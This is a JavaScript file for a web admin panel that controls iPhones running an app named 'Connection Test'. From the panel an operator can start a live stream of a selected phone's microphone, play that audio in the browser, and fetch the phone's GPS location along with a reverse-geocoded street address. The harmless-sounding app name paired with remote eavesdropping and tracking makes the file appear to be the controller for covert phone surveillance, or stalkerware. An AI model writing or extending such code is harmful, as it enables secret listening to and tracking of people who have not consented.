(function () {
  const getBackend = () => {
    const input = document.getElementById('backendUrl').value.trim();
    if (input) return input.replace(/\/$/, '');
    return window.location.origin;
  };
  let adminWs = null;
  let audioContext = null;
  let gainNode = null;
  let selectedDeviceId = null;
  let hasPlayedAudio = false;
  let nextPlayTime = 0;
  let chunksReceived = 0;

  function ensureAudioContext() {
    if (audioContext) return;
    audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
    gainNode = audioContext.createGain();
    gainNode.gain.value = 1;
    gainNode.connect(audioContext.destination);
  }

  function playTestSound() {
    ensureAudioContext();
    if (audioContext.state === 'suspended') audioContext.resume();
    const freq = 440;
    const duration = 0.3;
    const numSamples = Math.round(16000 * duration);
    const buf = audioContext.createBuffer(1, numSamples, 16000);
    const ch = buf.getChannelData(0);
    for (let i = 0; i < numSamples; i++) {
      ch[i] = Math.sin(2 * Math.PI * freq * i / 16000) * 0.3;
    }
    const src = audioContext.createBufferSource();
    src.buffer = buf;
    src.connect(gainNode);
    src.start(0);
    document.getElementById('audioStatus').textContent = 'If you heard a beep, your speaker works. Try Start listening.';
  }

  function fetchDevices() {
    const base = getBackend();
    fetch(`${base}/api/devices`)
      .then((r) => r.json())
      .then((list) => {
        const el = document.getElementById('deviceList');
        const connectedIds = new Set((list || []).filter((d) => d.connected).map((d) => d.deviceId));
        if (selectedDeviceId && !connectedIds.has(selectedDeviceId)) {
          document.getElementById('deviceDisconnectedWarning').style.display = 'block';
          document.getElementById('deviceDisconnectedWarning').textContent = 'Selected device is disconnected. Open the Connection Test app on your iPhone, tap Test, then refresh this page.';
        } else {
          document.getElementById('deviceDisconnectedWarning').style.display = 'none';
        }
        if (!list || !list.length) {
          el.innerHTML = '<span class="empty">No devices connected. Open the Connection Test app on your iPhone, enter the server URL, and tap Test.</span>';
          return;
        }
        el.innerHTML = list
          .map(
            (d) =>
              `<div class="device">
                <div>
                  <span class="device-id">${escapeHtml(d.deviceId)}</span>
                  <span class="status ${d.connected ? 'connected' : 'disconnected'}">${d.connected ? 'Connected' : 'Disconnected'}</span>
                </div>
                ${d.connected ? `<button class="primary" data-device="${escapeHtml(d.deviceId)}">Select & control</button>` : ''}
              </div>`
          )
          .join('');
        el.querySelectorAll('button[data-device]').forEach((btn) => {
          btn.addEventListener('click', () => selectDevice(btn.dataset.device));
        });
      })
      .catch((e) => {
        document.getElementById('deviceList').innerHTML =
          '<span class="empty">Could not reach backend. Set Backend URL and ensure the server is running.</span>';
      });
  }

  function escapeHtml(s) {
    const div = document.createElement('div');
    div.textContent = s;
    return div.innerHTML;
  }

  function selectDevice(deviceId) {
    selectedDeviceId = deviceId;
    document.getElementById('selectedDeviceId').textContent = 'Device: ' + deviceId;
    document.getElementById('controlPanel').style.display = 'block';
    document.getElementById('location').textContent = '';
    document.getElementById('audioStatus').textContent = '';
    document.getElementById('audioChunkCount').textContent = '';
    document.getElementById('btnStopListen').style.display = 'none';
    document.getElementById('btnStartListen').style.display = 'inline-block';
    document.getElementById('audioAllowSpan').style.display = 'none';
    if (adminWs) {
      adminWs.close();
      adminWs = null;
    }
  }

  function sendCommand(deviceId, action) {
    const base = getBackend();
    return fetch(`${base}/api/devices/${encodeURIComponent(deviceId)}/command`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action }),
    }).then((r) => {
      return r.json().then((body) => {
        if (!r.ok) return Promise.reject(new Error(body.error || 'Request failed'));
        return body;
      });
    });
  }

  function startListening() {
    if (!selectedDeviceId) return;
    ensureAudioContext();
    if (audioContext.state === 'suspended') audioContext.resume();

    const base = getBackend();
    const wsBase = base.replace(/^http/, 'ws').replace(/\/$/, '');
    const wsUrl = wsBase + '/ws?role=admin&deviceId=' + encodeURIComponent(selectedDeviceId);
    adminWs = new WebSocket(wsUrl);
    adminWs.binaryType = 'arraybuffer';

    hasPlayedAudio = false;
    chunksReceived = 0;
    nextPlayTime = 0;
    document.getElementById('audioAllowSpan').style.display = 'inline';
    adminWs.onopen = () => {
      document.getElementById('audioStatus').textContent = 'Streaming… (listen here)';
      document.getElementById('btnStartListen').style.display = 'none';
      document.getElementById('btnStopListen').style.display = 'inline-block';
      sendCommand(selectedDeviceId, 'start_listening').catch((err) => {
        document.getElementById('audioStatus').textContent = 'Device disconnected. Reconnect the app on your phone and try again.';
      });
    };

    adminWs.onmessage = (ev) => {
      if (ev.data instanceof ArrayBuffer && audioContext) {
        if (audioContext.state === 'suspended') audioContext.resume();
        chunksReceived++;
        document.getElementById('audioChunkCount').textContent = chunksReceived + ' chunks received';
        playPCM16(ev.data);
      }
    };

    adminWs.onclose = () => {
      document.getElementById('audioStatus').textContent = 'Stream ended.';
      document.getElementById('btnStartListen').style.display = 'inline-block';
      document.getElementById('btnStopListen').style.display = 'none';
    };

    adminWs.onerror = () => {
      document.getElementById('audioStatus').textContent = 'Connection error.';
    };
  }

  function playPCM16(arrayBuffer) {
    if (!audioContext || arrayBuffer.byteLength < 2) return;
    if (audioContext.state === 'suspended') audioContext.resume();
    hasPlayedAudio = true;
    document.getElementById('audioAllowSpan').style.display = 'none';
    const numSamples = arrayBuffer.byteLength / 2;
    const buffer = audioContext.createBuffer(1, numSamples, 16000);
    const channel = buffer.getChannelData(0);
    const view = new DataView(arrayBuffer);
    for (let i = 0; i < numSamples; i++) {
      channel[i] = view.getInt16(i * 2, true) / 32768;
    }
    const duration = numSamples / 16000;
    const now = audioContext.currentTime;
    if (nextPlayTime < now) nextPlayTime = now;
    const source = audioContext.createBufferSource();
    source.buffer = buffer;
    source.connect(gainNode || audioContext.destination);
    source.start(nextPlayTime);
    source.stop(nextPlayTime + duration);
    nextPlayTime += duration;
  }

  function allowSound() {
    ensureAudioContext();
    audioContext.resume().then(() => {
      var buf = audioContext.createBuffer(1, 1600, 16000);
      buf.getChannelData(0).fill(0);
      var src = audioContext.createBufferSource();
      src.buffer = buf;
      src.connect(gainNode);
      src.start(0);
    });
    document.getElementById('audioAllowSpan').style.display = 'none';
    document.getElementById('audioStatus').textContent = 'Streaming… (sound allowed – you should hear now)';
  }

  function stopListening() {
    if (adminWs) adminWs.close();
    adminWs = null;
    sendCommand(selectedDeviceId, 'stop_listening');
    document.getElementById('audioStatus').textContent = 'Stopped.';
    document.getElementById('audioChunkCount').textContent = '';
    document.getElementById('btnStartListen').style.display = 'inline-block';
    document.getElementById('btnStopListen').style.display = 'none';
    document.getElementById('audioAllowSpan').style.display = 'none';
  }

  function reverseGeocode(lat, lon) {
    return fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`,
      { headers: { 'Accept': 'application/json', 'User-Agent': 'ConnectionTestAdmin/1.0' } }
    ).then((r) => r.json()).then((data) => data.display_name || null).catch(() => null);
  }

  function setLocationText(lat, lon, accuracy, address) {
    const lines = [];
    if (address) lines.push('Address: ' + address);
    lines.push('Lat: ' + lat, 'Lon: ' + lon, 'Accuracy: ' + (accuracy ?? '—') + ' m', '', 'https://www.google.com/maps?q=' + lat + ',' + lon);
    document.getElementById('location').textContent = lines.join('\n');
  }

  function getLocation() {
    if (!selectedDeviceId) return;
    const base = getBackend();
    document.getElementById('location').textContent = 'Requesting location from device…';
    function fetchLocation() {
      return fetch(`${base}/api/devices/${encodeURIComponent(selectedDeviceId)}/location`).then((r) => r.json());
    }
    sendCommand(selectedDeviceId, 'get_location')
      .then(() => new Promise((r) => setTimeout(r, 1000)))
      .then(() => fetchLocation())
      .then((data) => {
        if (data.lat != null) {
          setLocationText(data.lat, data.lon, data.accuracy, null);
          reverseGeocode(data.lat, data.lon).then((address) => {
            if (address) setLocationText(data.lat, data.lon, data.accuracy, address);
          });
          return;
        }
        return new Promise((r) => setTimeout(r, 1500)).then(() => fetchLocation());
      })
      .then((data) => {
        if (!data) return;
        if (data.error === 'Device not found') {
          document.getElementById('location').textContent = 'Device disconnected. Reconnect the app and try again.';
          return;
        }
        if (data.lat != null) {
          setLocationText(data.lat, data.lon, data.accuracy, null);
          reverseGeocode(data.lat, data.lon).then((address) => {
            if (address) setLocationText(data.lat, data.lon, data.accuracy, address);
          });
        } else {
          document.getElementById('location').textContent = data.error || 'No location yet. Allow location for the app in Settings and try again.';
        }
      })
      .catch(() => {
        document.getElementById('location').textContent = 'Failed to get location.';
      });
  }

  document.getElementById('btnStartListen').addEventListener('click', startListening);
  document.getElementById('btnStopListen').addEventListener('click', stopListening);
  document.getElementById('btnTestSound').addEventListener('click', playTestSound);
  document.getElementById('btnLocation').addEventListener('click', getLocation);
  document.getElementById('btnAllowSound').addEventListener('click', allowSound);

  setInterval(fetchDevices, 3000);
  fetchDevices();
})();
